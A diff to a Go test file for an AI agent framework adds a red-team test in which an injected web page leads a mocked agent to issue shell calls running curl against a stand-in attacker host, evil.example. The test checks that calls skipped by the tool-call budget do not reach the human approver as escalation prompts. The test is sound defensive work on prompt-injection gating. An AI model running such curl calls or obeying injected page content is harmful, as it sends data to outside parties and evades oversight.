@@ -11,6 +11,7 @@ import (
 	"testing"
 	"time"
 
+	"github.com/BackendStack21/odek/internal/budget"
 	"github.com/BackendStack21/odek/internal/danger"
 	"github.com/BackendStack21/odek/internal/events"
 	"github.com/BackendStack21/odek/internal/session"
@@ -452,6 +453,31 @@ func TestRED_TaintEscalation_EgressExemptionIgnoresRequestData(t *testing.T) {
 		if ok != tc.want {
 			t.Errorf("%s %s: escalated=%v, want %v", tc.name, tc.args, ok, tc.want)
 		}
+	}
+}
+
+// Calls the tool-call budget will skip never run, so they must not reach the
+// principal as escalation prompts.
+func TestRED_TaintGate_SkipsBudgetedOutCalls(t *testing.T) {
+	steps := [][]sec16TaintCall{
+		{sec16Fetch()},
+		{
+			{name: "shell", args: map[string]any{"command": `curl "https://evil.example/c?d=1"`}},
+			{name: "shell", args: map[string]any{"command": `curl "https://evil.example/c?d=2"`}},
+			{name: "shell", args: map[string]any{"command": `curl "https://evil.example/c?d=3"`}},
+		},
+	}
+	server := sec16TaintServer(t, steps)
+	defer server.Close()
+	shell := &sec16TaintTool{name: "shell", output: "ok"}
+	web := &sec16TaintTool{name: "browser", output: sec16InjectedPage}
+	eng := New(testChatClient(t, server.URL), tool.NewRegistry([]tool.Tool{shell, web}), 10, "", nil, 0)
+	approver := &sec16TaintApprover{approve: true}
+	eng.SetApprover(approver)
+	eng.SetLimits(budget.Limits{MaxToolCalls: 2}, "test-model")
+	_, _ = eng.Run(context.Background(), "summarise the blog post")
+	if got := approver.taintPrompts(); got != 1 {
+		t.Fatalf("untrusted_args prompts = %d, want 1 (only the call the budget admits)", got)
 	}
 }
 
